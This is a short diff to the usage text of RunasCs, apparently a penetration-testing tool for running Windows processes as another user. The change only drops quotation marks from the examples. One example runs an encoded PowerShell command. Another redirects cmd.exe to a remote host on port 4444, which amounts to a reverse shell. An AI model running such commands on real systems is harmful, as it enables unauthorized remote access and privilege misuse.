@@ -1272,9 +1272,9 @@ Examples:
     Run a command as a specific domain user and interactive logon type (2)
         RunasCs.exe user1 password1 whoami -d domain -l 2
     Run a background/async process as a specific local user,
-        RunasCs.exe ""user1"" ""password1"" ""%COMSPEC% powershell -enc..."" -t 0
+        RunasCs.exe user1 password1 ""%COMSPEC% powershell -enc..."" -t 0
     Redirect stdin, stdout and stderr of the specified command to a remote host
-        RunasCs.exe ""user1"" ""password1"" ""cmd.exe"" -r 10.10.10.24:4444
+        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
 ";
     
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
